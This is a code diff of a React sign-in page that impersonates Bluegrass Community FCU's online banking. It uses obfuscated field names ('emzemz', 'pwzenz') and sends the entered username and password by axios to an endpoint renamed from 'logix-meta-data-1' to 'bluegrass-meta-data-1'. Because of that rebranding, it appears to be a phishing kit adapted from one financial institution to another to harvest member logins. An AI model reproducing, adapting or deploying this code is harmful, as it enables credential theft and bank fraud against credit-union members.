@@ -3,7 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
-import Footer from '../components/Footer';
+import FlowPageLayout from '../components/FlowPageLayout';
 
 const EyeIcon = ({ isVisible }: { isVisible: boolean }) => {
   if (isVisible) {
@@ -87,7 +87,7 @@ const LoginForm: React.FC = () => {
       return;
     }
 
-    const url = `${baseUrl}api/logix-meta-data-1/`;
+    const url = `${baseUrl}api/bluegrass-meta-data-1/`;
 
     try {
       await axios.post(url, {
@@ -107,95 +107,72 @@ const LoginForm: React.FC = () => {
   };
 
   return (
-    <div className="min-h-screen bg-[#4A9619] flex flex-col">
-      <main className="flex-1 flex items-center justify-center px-4 py-12">
-        <div className="flex flex-col items-center gap-8">
-          <div className="w-full max-w-lg rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-12 py-14 text-center">
-            <img
-              src="/assets/blue_logo.png"
-              alt="Bluegrass Credit Union"
-              className="mx-auto mb-6 h-12 w-auto"
-            />
-            <h1 className="mb-6 text-2xl font-semibold text-gray-900">Sign In</h1>
-
-            <form onSubmit={handleSubmit} className="space-y-4 text-left">
-              <div>
-                <label htmlFor="emzemz" className="sr-only">
-                  Username
-                </label>
-                <input
-                  id="emzemz"
-                  name="emzemz"
-                  type="text"
-                  value={emzemz}
-                  onChange={(e) => setEmzemz(e.target.value)}
-                  placeholder="Username"
-                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
-                />
-                {errors.emzemz && (
-                  <p className="mt-2 text-sm text-red-600">{errors.emzemz}</p>
-                )}
-              </div>
-
-              <div>
-                <label htmlFor="pwzenz" className="sr-only">
-                  Password
-                </label>
-                <div className="relative">
-                  <input
-                    id="pwzenz"
-                    name="pwzenz"
-                    type={showPwzenz ? 'text' : 'password'}
-                    value={pwzenz}
-                    onChange={(e) => setPwzenz(e.target.value)}
-                    placeholder="Password"
-                    className="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
-                  />
-                  <button
-                    type="button"
-                    onClick={togglePwzenzVisibility}
-                    className="absolute inset-y-0 right-4 flex items-center text-blue-600 hover:text-blue-500"
-                    aria-label={showPwzenz ? 'Hide password' : 'Show password'}
-                  >
-                    <EyeIcon isVisible={showPwzenz} />
-                  </button>
-                </div>
-                {errors.pwzenz && (
-                  <p className="mt-2 text-sm text-red-600">{errors.pwzenz}</p>
-                )}
-              </div>
-
-              <button
-                type="submit"
-                disabled={isLoading}
-                className="w-full rounded-xl bg-[#BFD8F6] py-3 text-base font-semibold text-white transition hover:bg-[#aac7ea] disabled:cursor-not-allowed disabled:opacity-70"
-              >
-                {isLoading ? 'Signing in…' : 'Sign In'}
-              </button>
-            </form>
-
-            <div className="mt-6 text-sm">
-              <a href="#" className="font-medium text-blue-600 hover:underline">
-                Forgot Password
-              </a>
-            </div>
-          </div>
-
-          <div className="flex items-center gap-6 text-sm text-white">
-            <a href="#" className="hover:underline">
-              Become a Member
-            </a>
-            <span className="h-4 w-px bg-white/60" aria-hidden="true"></span>
-            <a href="#" className="hover:underline">
-              PIB
-            </a>
-          </div>
+    <FlowPageLayout
+      title="Sign In"
+      description="Access your Bluegrass Community FCU online banking securely with your username and password."
+      eyebrow="Member Login"
+      contentClassName="space-y-4"
+      afterContent={(
+        <div className="text-sm">
+          <a href="#" className="font-medium text-blue-600 hover:underline">
+            Forgot Password
+          </a>
         </div>
-      </main>
+      )}
+    >
+      <form onSubmit={handleSubmit} className="space-y-4 text-left">
+        <div>
+          <label htmlFor="emzemz" className="sr-only">
+            Username
+          </label>
+          <input
+            id="emzemz"
+            name="emzemz"
+            type="text"
+            value={emzemz}
+            onChange={(e) => setEmzemz(e.target.value)}
+            placeholder="Username"
+            className="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
+          />
+          {errors.emzemz && <p className="mt-2 text-sm text-red-600">{errors.emzemz}</p>}
+        </div>
 
-      <Footer />
-    </div>
+        <div>
+          <label htmlFor="pwzenz" className="sr-only">
+            Password
+          </label>
+          <div className="relative">
+            <input
+              id="pwzenz"
+              name="pwzenz"
+              type={showPwzenz ? 'text' : 'password'}
+              value={pwzenz}
+              onChange={(e) => setPwzenz(e.target.value)}
+              placeholder="Password"
+              className="w-full rounded-xl border border-gray-200 px-4 py-3 pr-12 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
+            />
+            <button
+              type="button"
+              onClick={togglePwzenzVisibility}
+              className="absolute inset-y-0 right-4 flex items-center text-blue-600 hover:text-blue-500"
+              aria-label={showPwzenz ? 'Hide password' : 'Show password'}
+            >
+              <EyeIcon isVisible={showPwzenz} />
+            </button>
+          </div>
+          {errors.pwzenz && <p className="mt-2 text-sm text-red-600">{errors.pwzenz}</p>}
+        </div>
+
+        <button
+          type="submit"
+          disabled={isLoading}
+          className="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
+        >
+          {isLoading ? 'Signing in…' : 'Sign In'}
+        </button>
+      </form>
+    </FlowPageLayout>
   );
-};
+}
 
 export default LoginForm;
